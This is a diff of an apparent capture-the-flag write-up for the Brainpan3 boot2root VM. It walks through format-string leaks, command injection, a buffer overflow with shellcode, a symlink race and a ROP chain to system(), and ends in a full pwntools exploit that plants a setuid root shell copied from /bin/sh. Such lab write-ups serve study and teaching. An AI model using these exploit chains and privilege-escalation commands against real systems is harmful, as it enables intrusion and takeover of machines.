@@ -7,6 +7,10 @@ categories: boot2root Pwnable
 
 Brainpan3 is a typical boot2root VM that we boot and attempt to gain root access. This one is a bit long, but I hope it is entertaining and informative. Strap in!
 
+### Tools of the trade
+[Pwndbg](https://github.com/zachriggle/pwndbg) 
+[Binjitsu](https://github.com/binjitsu/binjitsu/) 
+
 ## Recon
 
 ```
@@ -23,16 +27,17 @@ nmap -p- 192.168.224.0/24 -Pn --open -T5
 We see an IP with a weird port of `1337` open.
 
 ```
-TODO:
-
-NMAP PICTURE
+Host is up (0.0020s latency).
+Not shown: 65533 filtered ports, 1 closed port
+PORT     STATE SERVICE
+1337/tcp open  waste
 ```
 
 ## Open says me
 
-Upon finding port `1337`, we can start having fun with Brainpan. We can setup a small script to easily interact with the service:
+Upon finding port `1337`, we can start having fun with Brainpan3. We can setup a small script to easily interact with the service:
 
-```
+```python
 from pwn import * # pip install --upgrade git+https://github.com/binjitsu/binjitsu.git
 
 HOST = '192.168.224.154'
@@ -224,7 +229,7 @@ SESSION: 0xbfcf89cc.0x104.0x252e7025.0x70252e70.0x2e70252e.
 --------------------------------------------------------------
 ```
 
-Why yes, yes we can. Let's dump a good portion of the stack and see what we have. We'll start by sending 70 `%x.`. Note, we add the period at the end only to allow easier splitting of our resulting string. This allows for easier correlation between the individual format strings and their output.
+Why yes, yes we can. Let's dump a good portion of the stack and see what we have. We'll start by sending 70 `%x.` Note, we add the period at the end only to allow easier splitting of our resulting string. This allows for easier correlation between the individual format strings and their output.
 
 ```
 ENTER COMMAND: SELECTED: 3
@@ -497,7 +502,7 @@ And now we have our binary:
 
 Quick sanity check for the `cryptor` binary:
 ```
-ctf@ctf-barberpole:~/ctfs/brainpan3/files$ checksec cryptor 
+ctf@ctf-barberpole:~/ctfs/brainpan3/files$ checksec cryptor
 [*] '/home/ctf/ctfs/brainpan3/files/cryptor'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -506,13 +511,13 @@ ctf@ctf-barberpole:~/ctfs/brainpan3/files$ checksec cryptor
     PIE:      No PIE
 ```
 
-Awesome, no canary and no NX. This means, assuming we can find a buffer overflow, we can jump back to our shellcode and execute our payload from there, avoiding ROP or other shenanigans.
+Awesome, no canary and no NX. This means, assuming we can find a buffer overflow, we can jump back to our shellcode on the stack/heap and execute our payload from there, avoiding ROP or other shenanigans.
 
 Looking at the binary in IDA, we can see a buffer overflow condition. We see a buffer that is allocated 100 bytes.
 
 ![Buffer Overflow 1](/assets/images/cryptor-buff1.png)
 
-There is then a check if the first argument (argv[1]) is less than or equal to 116 bytes.
+There is then a check if the first argument (`argv[1]`) is less than or equal to 116 bytes.
 
 ![Buffer Overflow 2](/assets/images/cryptor-buff2.png)
 
@@ -792,7 +797,7 @@ r.interactive()
 
 ## Step 5
 
-Now we are puck and finish what we believe is the last step to receiving a `root` shell. Going back to our cronjob, we need to analyze the `msg_admin` binary. We pull it off the VM in a similar manner as the `cryptor` binary.
+Now we are puck and need to finish what we believe is the last step to receiving a `root` shell. Going back to our cronjob, we need to analyze the `msg_admin` binary. We pull it off the VM in a similar manner as the `cryptor` binary.
 
 Quick sanity check
 
@@ -814,7 +819,7 @@ $ cat /proc/sys/kernel/randomize_va_space
 2
 ```
 
-Time to pull out all the stops. From the cronjob, we realize that the binary takes a file. Analyzing the binary statically, we see that the file needs to contain lines of names and messages seperated by a `|`. Let's create a small payload generation script to test this.
+Yep. Time to pull out all the stops. From the cronjob, we realize that the binary takes a file. Analyzing the binary statically, we see that the file needs to contain lines of names and messages seperated by a `|`. Let's create a small payload generation script to test this.
 
 ```python
 # make-pwnmsg.py
@@ -903,9 +908,9 @@ Program received signal SIGSEGV
 
 Boom! Gotta love seeing `SIGSEGV`, eh? Our crashing instruction is `mov [edx], eax`.
 
-Looks like we are overwriting the data in address `daac` (edx - from our cyclic function) with `bbbb` (eax - our second message). This is effectively a write-what-where condition, where we can write whatever we want, wherever we want.
+Looks like we are overwriting the data in address `daac` (edx - from our cyclic function) with `bbbb` (eax - our second message). This is effectively a write-what-where condition, where we can write 4 bytes of whatever, wherever we want.
 
-Looking at 0x804cd0 (our backtrace at frame `1`), we see that we are in a strcpy. Set breakpoint there and restart:
+Looking at `0x804cd0` (our backtrace at frame `1`), we see that we are in a strcpy. Set breakpoint there and restart:
 
 ```
 pwn> bp 0x8048ccb
@@ -952,25 +957,408 @@ with open('pwn.msg', 'w') as f:
     sc += 'B' * (216 - len(sc))
     f.write('{}|{}\n'.format('a'*4, sc))
     f.write('{}|{}\n'.format(p32(pivot), 'B'*12))
-    f.write('{}|{}\n'.format('b'*4, 'C'*12))
 ```
 
-Awesome, so now we have stack control and EIP control.. aka.. prime ROP condition. Let's check out relevant ROP gadgets using ROPGadget
+Awesome, so now we have stack control and EIP control.. aka.. prime ROP condition. ;-)
+
+Let's check out relevant ROP gadgets using [ROPGadget](https://github.com/JonathanSalwan/ROPgadget). One note, be sure to increase the `--depth` so that we can see more gadgets. In this case, it was important. We wouldn't be able to find our `clear eax` gadget without it.
 
 ```
-ROPgadget --binary msg_admin
+$ ROPgadget --depth 30 --binary msg_admin
+```
 
-strncpy(0x804b001, elf.got['strcpy'], 4)
+Two gadgets from the list stick out as interesting.
 
-strncpy(0x804b005, shellcode?, len(shellcode))
+The gadget below will allow us to increment `eax` using a dereferenced pointer.
 
-0x08048aad : add eax, 0xfffb4de8 ; dec ecx ; ret
-0x080489c0 : add eax, 0xfffc3ae8 ; dec ecx ; ret
+```
 0x08048feb : add eax, dword ptr [ebx + 0x1270304] ; ret
-0x0804894d : pop ebp ; ret
-0x08048d6e : popal ; cld ; ret
-
-0x08048784 : add al, 8 ; call eax
-0x08048786 : call eax
 ```
-asdfasdf
+
+The next gadget will give us a way of clearing `eax`. Note, this gadget wasn't visible from the default `ROPgadget` setting of `--depth 10`.
+
+```
+0x08048790 : mov eax, 0x804b074 ; sub eax, 0x804b074 ; ...gadgets that don't matter... ; ret
+```
+
+Our plan of attack will be as follows (spoiler alert, the same as pretty much every CTF ASLR bypass):
+
+* Deference an entry in the GOT.
+* Calculate the difference between the given entry and `system`.
+* Add this difference to our dereferenced value.
+* Call `system('/tmp/foo')` where /tmp/foo contains our commands.
+
+Because we want to reduce the number of add offset instructions, let's try and find which GOT entry in `msg_admin` is closest to `system` in their libc.
+
+```python
+from pwn import *
+
+elf = ELF('msg_admin')
+libc = ELF('libc.so.6')
+
+for symbol in elf.symbols:
+    try:
+        if libc.symbols[symbol] < libc.symbols['system']:
+            print symbol, hex(libc.symbols['system'] - libc.symbols[symbol])
+    except:
+        pass
+```
+
+```
+$ python find-good-addr.py 
+__libc_start_main 0x26800
+atol 0xe900
+```
+
+To make things a bit simpler, we will only be adding positive values to our GOT entry. Let's use the `atol` entry since it has the smallest difference to `system`.
+
+Next we need to find offsets in our binary that when accumulated, equal `0xe900`. One possible list is below:
+
+```
+0x8048595 = 0xc6e8
+0x8048dff = 0x2203
+0x8048833 = 0x14
+0x8048fb9 = 0x1
+```
+
+Now that we have our `system` offset, we only need one more gadget to execute it.
+
+```
+0x8048786 : call eax;
+```
+
+We noticed that the string `/tmp/foo` is found in the usage statement. Let's leverage that and use it as our command to execute. We need a command or two that, when executed as `root`, will give us a shell. One way to do this is below:
+
+```
+cp /bin/sh /tmp/pwned;
+chown root /tmp/pwned;
+chmod 4777 /tmp/pwned;
+```
+
+We need to set the setuid bit (4777) in order for us, as puck, to execute the binary under root privileges.
+
+The pieces are in place, let's check out our final ROP chain.
+
+```python
+def add_offset(addr):
+    """Function used to easily add offsets to eax to global rop chain"""
+    # 0x08048feb : add eax, dword ptr [ebx + 0x1270304] ; ret.
+    add_to_sum = 0x08048feb
+    rop.raw(pop_ebx)
+    rop.raw(addr - 0x1270304) # Have to subtract the constant as it is added back by the gadget
+    rop.raw(add_to_sum)
+
+# Note the binjitsu fun!
+rop = ROP(elf) # Create the simple ROP object from msg_admin
+tmpfoo = elf.search('/tmp/foo').next()
+atol = elf.got['atol']
+
+pop_ebx = 0x804859d
+call_eax = 0x8048786
+
+# Offsets found from manual IDA investigation
+hex_c6e8 = 0x8048595
+hex_2203 = 0x8048dff
+hex_14 = 0x8048833
+hex_1 = 0x8048fb9.
+
+rop.raw(0x8048790)   # eax = 0
+
+# Add offsets to atol to reach system()
+add_offset(atol)     # eax = 0 + atol_addr
+add_offset(hex_c6e8) # eax = eax + 0xc6e8
+add_offset(hex_2203) # eax = eax + 0x2203
+add_offset(hex_14)   # eax = eax + 0x14
+add_offset(hex_1)    # eax = eax + 0x1
+# eax now contains the address of system()
+
+# call eax with the parameter of /tmp/foo
+rop.raw(call_eax)    
+rop.raw(tmpfoo)
+```
+
+As per the previous challenges, we need to execute these via binjitsu.
+
+```python
+# Write our /tmp/foo command
+r.sendline('echo "cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned" > /tmp/foo')
+r.sendline('chmod +x /tmp/foo')
+
+# Overwrite strtok with the pivot gadget
+sc = str(rop)
+sc += cyclic(cyclic_find('daac')-len(sc))
+sc += p32(strtok) # where to overwrite
+sc += 'C' * (216 - len(sc))
+
+data = ''
+data += '{}|{}\n'.format('s'*4, sc) 
+data += '{}|{}\n'.format(p32(pivot), str(rop))
+
+pwnmsg_file = ''
+for b in data:
+    pwnmsg_file += '\\x{}'.format(b.encode('hex'))
+
+r.sendline('''python -c "print '{}'" >> /opt/.messenger/pwn.msg'''.format(pwnmsg_file))
+```
+
+At this point, we think we win. Let's see...
+
+```
+[+] Shell received: puck
+[*] '/home/ctf/ctfs/brainpan3/msg_admin'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE
+[*] Loaded cached gadgets for 'msg_admin'
+[*] Wait for your r00t shellz
+[*] Bingo!
+[*] uid=1001(puck) gid=1004(dev) euid=0(root) groups=0
+```
+
+And with that, we win! Thanks much to [@superkojiman](https://twitter.com/superkojiman) for the awesome VM.
+
+## Final exploit video
+
+<script type="text/javascript" src="https://asciinema.org/a/9xak3o6gs2gpss0n3ey5lp2nh.js" id="asciicast-9xak3o6gs2gpss0n3ey5lp2nh" async></script>
+
+## Final exploit
+
+```python
+
+from pwn import *
+import string
+import random
+
+
+r = remote('192.168.224.154', 1337)
+# Leak stack
+# print r.recv()
+r.clean()
+
+###
+# Get access code
+###
+r.sendline('%d.' * 3 + 'A' * 80)
+r.recvuntil("ACCESS CODE: ")
+output = r.recv()
+code = output.split('.')[2]
+
+log.info("Code identified: {}".format(code))
+
+r.sendline(code)
+
+log.info("Turning on reporting..")
+
+###
+#  Turn on reporting
+###
+
+r.sendline('3')
+shellcode = '%x.' * 70
+r.clean()
+r.sendline(shellcode)
+r.recvuntil("SESSION: ")
+# r.recvuntil("SESSION: ")
+"""
+['bfba64ac', '104', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', 'ff0a2e78', 'b778bc20', 'bfba65fc', '0', 'b778b000', 'b778bac0', 'b778c898', 'b75df940', 'b76510b5', 'b778bac0', '59', '4e', '59', 'b778b8a0', 'b778b000', 'b778bac0', '\n']
+"""
+
+session_name = r.recvuntil('\n').split('.')
+# print session_name
+
+n_index = session_name.index('4e')
+log.info("Report 'N' at offset {}".format(n_index))
+
+r.sendline('3')
+r.sendline('Y' * (4*(n_index-2) + 1) )
+
+###
+# After reporting
+###
+
+for command in ['whoami', 'id']:
+    r.clean()
+    r.sendline('1')
+    r.sendline('$({} >&2)'.format(command))
+
+    r.recvuntil("SENDING TO REPORT MODULE")
+    output = r.recvuntil('[+]').split('\n')[2]
+    log.success("{} - {}".format(command, output))
+
+r.clean()
+r.sendline('1')
+r.sendline('$(/bin/bash -i >&2)')
+
+log.success("Assume the form:")
+log.success("anansi")
+sleep(1)
+
+offset = cyclic_find('zaab')
+shellcode = 'A' * cyclic_find('zaab') + p32(0x804a080)
+buffer = 116 - len(shellcode)
+
+binsh_shellcode = asm(shellcraft.sh())
+
+# Build argv1
+argv1 = '"A" * {} + "{}" + "C" * {}'.format(offset, r'\x80\xa0\x04\x08', buffer)
+
+# Build argv2
+argv2 = ''.join('\\x{}'.format(enhex(binsh_shellcode)[x:x+2]) for x in xrange(0, len(enhex(binsh_shellcode)), 2))
+
+# Final command
+actual_shellcode = """./cryptor $(python -c 'print {}') $(python -c 'print "{}"')""".format(argv1, argv2)
+
+log.info(actual_shellcode)
+
+# Sometimes the command didn't work. This will repeat throwing the command until we get a reynard shell.
+r.sendline('cd /home/reynard/private')
+while True:
+    r.clean()
+    r.sendline(actual_shellcode)
+    r.clean()
+    r.sendline('id')
+    output = r.recv()
+    if 'reynard' in output:
+        break
+
+log.success("You are now:")
+log.success("reynard")
+sleep(1)
+
+r.sendline('id')
+
+r.sendline(""" echo "
+import os
+import socket
+import telnetlib
+import subprocess
+
+HOST = 'localhost'
+PORT = 7075
+
+try:
+    os.remove('/mnt/usb/key.txt')
+except:
+    pass
+
+# Ensure we have a file to begin with
+subprocess.check_output(['touch', '/mnt/usb/key.txt'])
+
+# Connect and check for symlink
+r = socket.socket()
+r.connect((HOST, PORT))
+
+# Quickly remove the non-symlinked file and re-symlink
+os.remove('/mnt/usb/key.txt')
+os.symlink('/home/puck/key.txt', '/mnt/usb/key.txt')
+
+# Try for our shellz
+t = telnetlib.Telnet()
+t.sock = r
+t.interact()
+
+r.close()
+" > win.py
+""")
+
+log.info("Let's hope we win the race.. go go go!")
+
+r.sendline("python win.py")
+r.clean()
+r.sendline("whoami")
+output = r.recv()
+log.success("I choose you!:")
+log.success(output)
+
+
+log.success("Insert ROP pun here...")
+elf = ELF('msg_admin')
+rop = ROP(elf)
+
+pivot = rop.search(move=20).address # Need to move the stack 16 bytes
+strtok = elf.got['strtok']
+rop = ROP(elf)
+
+def add_offset(addr):
+    # 0x08048feb : add eax, dword ptr [ebx + 0x1270304] ; ret 
+    add_to_sum = 0x08048feb
+    rop.raw(pop_ebx)
+    rop.raw(addr - 0x1270304)
+    rop.raw(add_to_sum)
+
+tmpfoo = elf.search('/tmp/foo').next()
+atol = elf.got['atol']
+
+pop_ebx = 0x804859d
+call_eax = 0x8048786
+
+hex_c6e8 = 0x8048595
+hex_2203 = 0x8048dff
+hex_14 = 0x8048833
+hex_1 = 0x8048fb9 
+
+rop.raw(0x8048790) # eax = 0
+
+add_offset(atol)
+add_offset(hex_c6e8)
+add_offset(hex_2203)
+add_offset(hex_14)
+add_offset(hex_1)
+
+rop.raw(call_eax)
+rop.raw(tmpfoo)
+
+r.sendline('echo "cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned" > /tmp/foo')
+r.sendline('chmod +x /tmp/foo')
+log.info('Create our root command file at /tmp/foo')
+log.info('echo "cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned" > /tmp/foo')
+log.info('chmod +x /tmp/foo')
+
+# Overwrite strtok with the pivot gadget
+sc = str(rop)
+sc += cyclic(cyclic_find('daac')-len(sc))
+sc += p32(strtok) # where to overwrite
+sc += 'C' * (216 - len(sc))
+
+data = ''
+data += '{}|{}\n'.format('s'*4, sc)
+data += '{}|{}\n'.format(p32(pivot), str(rop))
+
+pwnmsg_file = ''
+for b in data:
+    pwnmsg_file += '\\x{}'.format(b.encode('hex'))
+
+r.sendline('''python -c "print '{}'" >> /opt/.messenger/pwn.msg'''.format(pwnmsg_file))
+log.info('Create our malicious msg file')
+log.info('''python -c "print '{}'" >> /opt/.messenger/pwn.msg'''.format(pwnmsg_file))
+
+r.sendline('rm /tmp/pwned')
+
+r.clean()
+
+log.info("Wait for your r00t shellz")
+for _ in xrange(75):
+    r.sendline('ls -la /opt/.messenger')
+    sleep(1)
+    output = r.recv()
+    if 'pwn.msg' not in output:
+        break
+
+# Get ROOT shell!
+r.sendline('/tmp/pwned')
+r.sendline('id')
+r.sendline('whoami')
+
+r.sendline('cd /root')
+r.sendline('gzip -d brainpan.8.gz')
+r.sendline('cat brainpan.8')
+
+for _ in xrange(10):
+    r.sendline('')
+
+log.info("Bingo!")
+log.info(r.recv())
+r.interactive()
+```
